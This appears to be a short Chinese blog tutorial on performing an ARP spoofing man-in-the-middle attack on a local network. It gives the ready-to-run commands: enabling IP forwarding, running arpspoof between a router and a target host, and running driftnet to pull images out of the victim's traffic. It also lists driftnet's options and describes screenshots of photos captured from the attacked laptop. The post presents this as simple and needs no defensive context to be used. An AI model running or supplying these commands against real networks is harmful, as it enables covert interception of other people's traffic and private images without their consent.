### 其实这个也是非常简单，只有三句命令就可以实现。没啥技术难度，不过只能在局域网内实现。

##### 1、更改转发模式

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q4h2n18j30vv0u07wh.jpg" alt="image-20200523215235878"  />

##### 2、arp攻击             

```
 arpspoof -i eth0 -t 192.168.1.1  192.168.1.100
 
  arpspoof -i eth0 -t 192.168.123.1  192.168.123.119
 
#arpspoof -i eth0 -t [路由器ip] [目标主机ip]
```

> `192.168.123.1`是我路由器地址，`192.168.123.116`是我笔记本的地址

<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2pnalgspj30vq0u01ky.jpg" alt="image-20200523213603947"  />

##### 3、数据还原分析      

```
# driftnet -i eth0
//eth0是网卡
```

<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2proex9tj30u00vy7wh.jpg" alt="image-20200523214018000"  />

###### 参数命令

> ` -b ` ：捕获到新的图片时发出嘟嘟声
>
> ` -i interface` ：选择监听接口
>
> `-f file `：读取一个指定pcap数据包中的图片
>
> ` -p` ：不让所监听的接口使用混杂模式
>
> ` -a` ：后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）
>
> ` -m number` ：指定保存图片数的数目
>
> `-d directory` ：指定保存图片的路径
>
> `-x prefix `：指定保存图片的前缀名

### 结果：

<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2pzieux9j31400u0qv8.jpg" alt="41590241281_.pic_hd"  />

> 左边电脑是被攻击者，右边窗口中的图片就是截取被攻击者网络数据包中抓取的图片

<img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf2q2mw4k2j30u00v5qv5.jpg" alt="image-20200523215050019"  />

> 截取的所有照片都会在文件夹中显示